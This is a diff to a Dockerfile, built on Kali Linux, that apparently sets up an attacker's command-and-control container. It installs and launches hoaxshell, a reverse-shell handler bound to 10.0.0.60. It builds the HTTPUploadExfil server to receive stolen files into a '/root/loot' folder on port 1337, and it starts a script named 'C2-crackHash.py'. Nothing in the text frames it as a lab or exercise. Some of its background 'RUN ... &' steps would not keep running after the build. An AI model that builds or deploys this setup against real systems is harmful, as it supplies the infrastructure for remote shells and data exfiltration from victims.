@@ -1,7 +1,7 @@
 FROM kalilinux/kali-rolling
 
 # Set working directory to /root
-WORKDIR /root
+WORKDIR /opt
 
 # Update
 RUN apt -y update && DEBIAN_FRONTEND=noninteractive apt -y dist-upgrade && apt -y autoremove && apt clean
@@ -29,19 +29,18 @@ COPY wordlist.txt /opt/wordlist.txt
 RUN chmod +x /opt/hoaxshell.py \
   && pip3 install ipython\
   && pip3 install flask
-  
+
 
 # Set up Exfil
 RUN git clone https://github.com/IngoKl/HTTPUploadExfil.git /opt/HTTPUploadExfil
 
-#Set work directory to the HTTP for the building
-#WORKDIR /opt/HTTPUploadExfil/
-CMD cd /opt/HTTPUploadExfil \
- && go build
+RUN cd /opt/HTTPUploadExfil \
+  && go build
 
-CMD python3 C2-crackHash.py
+RUN python3 /opt/hoaxshell.py -o -s 10.0.0.60 &
 
-#RUN python3 -m pip install flask\
- #&& python3 C2-crackHash.py &
+RUN python3 /opt/C2-crackHash.py &
+
+CMD /opt/HTTPUploadExfil/httpuploadexfil :1337 /root/loot	
 
 # ENTRYPOINT ["/bin/zsh"]
